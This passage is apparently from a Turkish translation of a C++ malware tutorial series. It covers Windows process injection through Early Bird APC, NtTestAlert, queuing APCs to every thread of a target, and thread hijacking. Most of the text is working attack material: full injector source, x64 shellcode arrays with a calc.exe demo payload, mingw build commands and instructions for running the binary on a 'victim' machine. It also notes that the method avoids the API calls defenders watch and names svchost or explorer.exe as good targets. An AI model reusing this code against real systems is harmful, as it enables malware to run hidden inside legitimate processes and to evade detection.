	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
	0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
Derlemeyi başlayalım:
x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc
++++++++++++++++++++
Hadi, Windows 7 x64 üzerinde evil.exe'yi başlatalım:
++++++++++++++++++++++
Process Hacker ile yeni başlatılan notepad.exe'yi kontrol edersek, ana iş parçacığının gerçekten askıya alınmış durumda olduğunu doğrulayabiliriz:
++++++++++++++++++++++
Gördüğünüz gibi, WaitForSingleObject işlevinin ikinci parametresi, gösterim amacıyla 30000 olarak ayarlandı; gerçek dünya senaryosunda bu kadar büyük olmayabilir.

Ayrıca, evil.exe'miz Windows 10 x64 üzerinde de çalıştı:
+++++++++++++++++++++++++++
APC MSDN(https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
QueueUserAPC(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WaitForSingleObject(https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
ResumeThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
ZeroMemory(https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366920(v=vs.85)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-11-11-malware-injection-3
Gelecekte, daha gelişmiş kod enjeksiyon tekniklerini anlamaya çalışacağım.
Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
14.APC Enjeksiyonu NtTestAlert ile. Basit C++ Zararlı Yazılım.
Bismillah
+++++++++++++++++++
Bir önceki bölümde, “Early Bird” APC enjeksiyon tekniğinden bahsetmiştim. 
Bu bölümde ise başka bir APC enjeksiyon tekniğini ele alacağım. Bu teknik, belgelenmemiş bir NtTestAlert işlevini kullanmamız anlamına geliyor. Şimdi, bir Win32 API olan QueueUserAPC ve resmi olarak belgelenmemiş bir Native API olan NtTestAlert'ten faydalanarak bir yerel süreçte kabuk kodu nasıl çalıştırılacağını gösterelim.
NtTestAlert
NtTestAlert, Windows'un uyarı mekanizmasıyla ilgili bir sistem çağrısıdır. Bu sistem çağrısı, iş parçacığının bekleyen tüm APC'lerini çalıştırmasına neden olabilir. Bir iş parçacığı Win32 başlangıç adresini çalıştırmaya başlamadan önce, bekleyen tüm APC'leri çalıştırmak için NtTestAlert çağrısı yapar.
Örnek
Zararlı yazılımımızın C++ kaynak koduna bir göz atalım:
/*
hack.cpp
APC code injection via undocumented NtTestAlert
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/20/malware-injection-4.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")using myNtTestAlert = NTSTATUS(NTAPI*)();
unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
int main(int argc, char* argv[]) {
	SIZE_T my_payload_len = sizeof(my_payload);
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	myNtTestAlert testAlert = (myNtTestAlert)(
		GetProcAddress(hNtdll, "NtTestAlert"));
	LPVOID my_payload_mem = VirtualAlloc(NULL, my_payload_len,
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(),
	my_payload_mem, my_payload,
	my_payload_len, NULL);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)
	my_payload_mem;
	QueueUserAPC(
		(PAPCFUNC)apcRoutine,
	GetCurrentThread(), NULL
	);
	testAlert();

	return 0;
}
Basitlik adına, payload olarak 64-bit calc.exe'yi kullanıyoruz.

Bu tekniğin akışı oldukça basittir. Öncelikle, yükümüz için yerel süreçte bellek tahsis ederiz:
++++++++++++++++++
Daha sonra payload’ımızı yeni tahsis edilen belleğe yazarız:
+++++++++++++++++++++++
Ardından, mevcut iş parçacığına bir APC sıraya alırız:
++++++++++++++++++++++++
Son olarak, NtTestAlert çağrısı yaparız:
++++++++++++++++++++++++++++
Kodumuzu derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

ve kurban makinede (benim durumumda Windows 7 x64) çalıştıralım:
+++++++++++++++++++++++++
Eğer zararlı yazılımımızı (hack.exe) Ghidra'da açarsak:
++++++++++++++++++++++++++++++++
NtTestAlert işlev çağrısı şüpheli değildir. Bu tekniğin avantajı, mavi takım üyeleri tarafından daha fazla araştırılan ve daha popüler olan CreateThread veya CreateRemoteThread API çağrılarına dayanmadığıdır.

APC MSDN(https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
QueueUserAPC(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
VirtualAlloc(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
GetModuleHandleA(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
GetProcAddress(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
APC technique MITRE ATT&CK(https://attack.mitre.org/techniques/T1055/004/)
NTAPI Undocumented Functions – NtTestAlert(http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html)
Ghidra – NSA(https://github.com/NationalSecurityAgency/ghidra/)
Github’taki kaynak kod:(https://github.com/cocomelonc/2021-11-20-injection-4)
Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

APC Enjeksiyonu Uyarılabilir İş Parçacıkları Aracılığıyla. Basit C++ Zararlı Yazılım.
Bismillah
++++++++++++++++++++++++++
Bugün, en basit APC enjeksiyon tekniğinden bahsedeceğim. Uzak iş parçacıklarında APC enjeksiyonu hakkında konuşacağım. En basit yöntemde, hedef sürecin tüm iş parçacıklarına APC enjekte edilir, çünkü bir iş parçacığının uyarılabilir olup olmadığını bulmak için bir işlev yoktur ve iş parçacıklarından birinin uyarılabilir olduğunu varsayarak APC işimizi çalıştırabiliriz.
Örnek
Bu tekniğin akışı şu şekildedir:
Hedef sürecin kimliğini bulun.
Yükümüz için hedef süreçte alan tahsis edin.
Tahsis edilen alana yükü yazın.
Hedef süreç iş parçacıklarını bulun.
Yükümüzü çalıştırmak için hepsine bir APC sıraya alın.
İlk adım için hedef sürecin kimliğini bulmamız gerekiyor. Bunun için geçmiş bölümlerimden bir işlev kullandım:
+++++++++++++++++++++++++
Bu işlevin tam kaynak kodu:
int findMyProc(const char *procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}
Daha sonra, hedef süreçte payload’ımız için alan tahsis edin:
++++++++++++++++++++++++
Gördüğünüz gibi, bu alan PAGE_EXECUTE_READWRITE izinleriyle tahsis edilmelidir, bu da çalıştırma, okuma ve yazma anlamına gelir.
Bir sonraki adımda, payload’ımızı tahsis edilen belleğe yazarız:
++++++++++++++++++++++++++++++++++++++++
Sonra hedef süreç iş parçacıklarını buluruz. Bunun için başka bir işlev olan getTids'i yazdım:
+++++++++++++++++++++++++
getTids, bir süreç PID'si tarafından tüm iş parçacıklarını bulur. Tüm iş parçacıklarını sıralarız ve iş parçacığı hedef sürecimize aitse, bunu tids vektörümüze ekleriz.
Ardından, tüm iş parçacıklarına payload’ımızı çalıştırmak için bir APC sıraya alın:
++++++++++++++++++++++++++++++
Gördüğünüz gibi, QueueUserAPC işlevini kullanarak iş parçacığına bir APC sıraya alıyoruz. İlk parametre, çalıştırmak istediğimiz işlevin bir işaretçisi olmalı, yani payload’ın bir işaretçisi ve ikinci parametre, uzak iş parçacığına bir işleyicidir.
Zararlı yazılımımızın tam C++ kaynak koduna bir göz atalım:
/*
hack.cpp
APC injection via Queue an APC into all the threads
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/11/22/malware-injection-5.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
	0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

unsigned int my_payload_len = sizeof(my_payload);

// get process PID
int findMyProc(const char *procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
		break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
	}
	
	// find process threads by PID
	DWORD getTids(DWORD pid, std::vector<DWORD>& tids) {
	HANDLE hSnapshot;
	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (Thread32First(hSnapshot, &te)) {
		do {
			if (pid == te.th32OwnerProcessID) {
				tids.push_back(te.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &te));
	}
	CloseHandle(hSnapshot);
	return !tids.empty();
}
int main(int argc, char* argv[]) {
	DWORD pid = 0; // process ID
	HANDLE ph; // process handle
	HANDLE ht; // thread handle
	LPVOID rb; // remote buffer
	std::vector<DWORD> tids; // thread IDs

	pid = findMyProc(argv[1]);
	if (pid == 0) {
		printf("PID not found :( exiting...\n");
	return-1;
	} else {
		printf("PID = %d\n", pid);

		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

	if (ph == NULL) {
		printf("OpenProcess failed! exiting...\n");
		return-2;
	}

	// allocate memory buffer for remote process
	rb = VirtualAllocEx(ph, NULL,
	my_payload_len,
	MEM_RESERVE | MEM_COMMIT,
	PAGE_EXECUTE_READWRITE);

	// write payload to memory buffer
	WriteProcessMemory(ph, rb,
	my_payload,
	my_payload_len, NULL);

	if (getTids(pid, tids)) {
		for (DWORD tid : tids) {
			HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
			if (ht) {
				QueueUserAPC((PAPCFUNC)rb, ht, NULL);
				printf("payload injected via QueueUserAPC\n");
				CloseHandle(ht);
			}
		}
	}
	CloseHandle(ph);
}
return 0;
}
Her zamanki gibi, basitlik adına, payload olarak 64-bit calc.exe'yi kullanıyoruz ve gösterim için bir mesaj yazdırıyoruz.
Kodumuzu derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

++++++++++++++++++++++++++++++
Sonra kurban makinede önce bir mspaint.exe oturumu başlatalım (Windows 7 x64 benim durumumda):
++++++++++++++++++++++++++++++++
Ardından zararlı yazılımımızı çalıştıralım:
.\hack.exe mspaint.exe
++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel bir şekilde çalışıyor.
Ayrıca, Windows 10 x64 üzerinde de mükemmel çalıştı:
+++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++
Ancak, Windows 7 x64 makinemde hedef süreç çöktü:
++++++++++++++++++++++++++++++++++++++++++++++++
Bu neden oldu henüz anlamadım. 
Bu tekniğin sorunu, bir şekilde tahmin edilemez olmasıdır ve birçok durumda payload’ımızı birden fazla kez çalıştırabilir. Hedef süreç için, neredeyse her zaman uyarılabilir iş parçacıklarına sahip oldukları için svchost veya explorer.exe'nin iyi bir seçim olduğunu düşünüyorum.
APC MSDN(https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)
QueueUserAPC(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
CreateToolhelp32Snapshot(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
Process32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
Process32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
Strcmp(https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-160)
Taking a Snapshot and Viewing Processes(https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)
Thread32First(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first)
Thread32Next(https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next)
CloseHandle(https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-11-22-malware-injection-5

16. Thread Hijacking ile Kod Enjeksiyonu. Basit C++ Zararlı Yazılım.
Bismillah
Bu ne anlama geliyor?
Bugün, uzaktaki bir sürece thread hijacking (iş parçacığı ele geçirme) yöntemiyle kod enjeksiyonunu anlatacağım. Bu, yeni bir uzak iş parçacığı oluşturmak yerine mevcut iş parçacıklarını ele geçirerek kod enjekte etmeyi içerir. Kod enjeksiyonu yöntemlerinden biri, bir yürütülebilir kod konumunda başka bir süreçten bir iş parçacığı oluşturmak için `CreateRemoteThread` kullanmaktır, bunu daha önce yazmıştım. Veya örneğin, `CreateRemoteThread` ile `LoadLibrary` işlevini çalıştırarak ve `CreateRemoteThread` içinde bir argüman geçirerek klasik DLL enjeksiyonu yapılabilir. Bu teknik hakkındaki yazımı bulabilirsiniz.
Örnek
Bu tekniği gösteren bir örneğe bakalım: 
/*
hack.cpp
code injection via thread hijacking
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/23/malware-injection-6.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
	0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

unsigned int my_payload_len = sizeof(my_payload);

// get process PID
int findMyProc(const char *procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);
	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}	
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	DWORD pid = 0; // process ID
	HANDLE ph; // process handle
	HANDLE ht; // thread handle
	LPVOID rb; // remote buffer

	HANDLE hSnapshot;
	THREADENTRY32 te;
	CONTEXT ct;

	pid = findMyProc(argv[1]);
	if (pid == 0) {
		printf("PID not found :( exiting...\n");
		return-1;
	} else {
		printf("PID = %d\n", pid);

		ct.ContextFlags = CONTEXT_FULL;
		te.dwSize = sizeof(THREADENTRY32);

		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
		if (ph == NULL) {
			printf("OpenProcess failed! exiting...\n");
			return-2;
		}
		// allocate memory buffer for remote process
		rb = VirtualAllocEx(ph, NULL, my_payload_len,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

		// write payload to memory buffer
		WriteProcessMemory(ph, rb, my_payload,
		my_payload_len, NULL);

		// find thread ID for hijacking
		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
		if (Thread32First(hSnapshot, &te)) {
			do {
				if (pid == te.th32OwnerProcessID) {
					ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
					break;
				}
			} while (Thread32Next(hSnapshot, &te));
		}

		// suspend target thread
		SuspendThread(ht);
		GetThreadContext(ht, &ct);
		// update register (RIP)
		ct.Rip = (DWORD_PTR)rb;
		SetThreadContext(ht, &ct);
		ResumeThread(ht);
		CloseHandle(ph);
	}
	return 0;
}
Her zamanki gibi, basitlik adına payload olarak 64-bit calc.exe kullanıyoruz. 
Gördüğünüz gibi,süreçleri isimle bulmak için önceki yazımdan bir işlev olan `findMyProc` işlevini kullandım. Daha sonra, ana işlevim, önceki yazımdaki 'klasik' uzak süreç kod enjeksiyonuna benzer. Tek fark, yeni bir iş parçacığı oluşturmak yerine mevcut bir iş parçacığını ele geçirmemizdir.
Bu tekniğin akışı şu şekilde:Öncelikle, hedef süreci buluyoruz:
+++++++++++++++++++++ 
Daha sonra, her zamanki gibi hedef süreçte payload için alan tahsis ediyoruz:
++++++++++++++++++++
payload'u tahsis edilen alana yazıyoruz:
+++++++++++++++++++++++ 

